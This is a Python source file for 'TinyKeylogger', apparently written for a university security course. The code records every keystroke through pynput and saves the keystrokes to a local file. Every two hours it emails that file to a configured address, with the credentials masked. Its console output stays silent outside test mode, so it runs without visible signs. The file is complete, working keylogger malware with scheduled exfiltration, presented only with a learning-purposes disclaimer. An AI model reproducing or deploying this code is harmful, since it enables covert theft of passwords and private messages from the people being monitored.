import threading
import time
import sys

from datetime import datetime
from mailer import Mailer
from pynput import keyboard
from pynput.keyboard import Listener, Key


global return_time
global before_pressed
global log_active

TIME_TO_RETURN = 300
TIME_TO_EMAIL = 7200
FINISH_IT = {keyboard.Key.esc}

 
def manageKey(key):
    global return_time

    try:
        if key == Key.tab and before_pressed == Key.ctrl_l:
            log("")
    except:
        log("Exporting force manually")
        save("\n")
        sendData()
            
    if key in FINISH_IT:
        sys.exit()
    elif key == Key.space:
        c = " "
    elif key == Key.enter:
        c = "\n"
    elif key == Key.tab:
        c = "\t"
    elif key == Key.backspace or key == Key.shift_r or key == Key.shift:
        c = ""
    elif key == Key.ctrl or key == Key.ctrl_l:
        c = ""
    else:
        c = str(key)
        c = c.replace("'","")
    
    save(c)
    before_pressed = key
    return_time = 0


def save(c):
    with open("pulsaciones_grabadas.txt", 'a+') as f:
        f.write(c)

def timer():
    global return_time
    email_time = 0

    while True:
        time.sleep(1)
        email_time +=1
        return_time +=1
        
        if return_time == TIME_TO_RETURN:
            save(str(Key.enter))
            log("Return added at {}".format(str(datetime.now())))
        if email_time == TIME_TO_EMAIL:
            email_time=0
            sendData()
            log("Sent data at {}".format(str(datetime.now())))

            

def sendData():
    log("Sending mail with data")
    mail = Mailer(email='XXXXX',
              password='XXXXX')
    
    mail.send(receiver='XXXXX',
          subject='Fundamentos de Seguridad - TinyKeylogger',
          message='TinyKeyLogger has collected data',
          file='pulsaciones_grabadas.txt')


def log(message):
    if log_active:
        print(message)

def main():
    global log_active

    if TIME_TO_RETURN == 5:
        log_active = True
    else:
        log_active = False

    header()
    log(" Initializating at {}".format(str(datetime.now())))

    return_time = 0
    scheduler = threading.Thread(target=timer, daemon=True)
    scheduler.start()
    log(" Scheduler started at {}. Tiny Keylogger is working in test mode normally".format(str(datetime.now())))

    with Listener(on_press=manageKey) as l:
        l.join()

                                                                                                    
def header():
    log(" _________  ___  ________       ___    ___      ___  __    _______       ___    ___ ___       ________  ________  ________  _______   ________     ")
    log("|\___   ___\\  \|\   ___  \    |\  \  /  /|    |\  \|\  \ |\  ___ \     |\  \  /  /|\  \     |\   __  \|\   ____\|\   ____\|\  ___ \ |\   __  \    ")
    log("\|___ \  \_\ \  \ \  \\ \  \   \ \  \/  / /    \ \  \/  /|\ \   __/|    \ \  \/  / | \  \    \ \  \|\  \ \  \___|\ \  \___|\ \   __/|\ \  \|\  \   ")
    log("     \ \  \ \ \  \ \  \\ \  \   \ \    / /      \ \   ___  \ \  \_|/__   \ \    / / \ \  \    \ \  \\\  \ \  \  __\ \  \  __\ \  \_|/_\ \   _  _\  ")
    log("      \ \  \ \ \  \ \  \\ \  \   \/  /  /        \ \  \\ \  \ \  \_|\ \   \/  /  /   \ \  \____\ \  \\\  \ \  \|\  \ \  \|\  \ \  \_|\ \ \  \\  \| ")
    log("       \ \__\ \ \__\ \__\\ \__\__/  / /           \ \__\\ \__\ \_______\__/  /  /     \ \_______\ \_______\ \_______\ \_______\ \_______\ \__\\ _\ ")
    log("        \|__|  \|__|\|__| \|__|\___/ /             \|__| \|__|\|_______|\___/ /        \|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__|")
    log("                              \|___|/                                  \|___|/                                                                     ")
    log("")
    log("This software was developed only for learning purposes. Author: Daniel Cortés Fernández")
    log("")
                                                               

if __name__ == '__main__':
    return_time = 0
    if len(sys.argv) > 1:
        if sys.argv[1] == "test":
            TIME_TO_RETURN = 5
            TIME_TO_EMAIL = 20
        else:
            print("Execute: python3 main.py [test]")
            sys.exit()
            
    main()

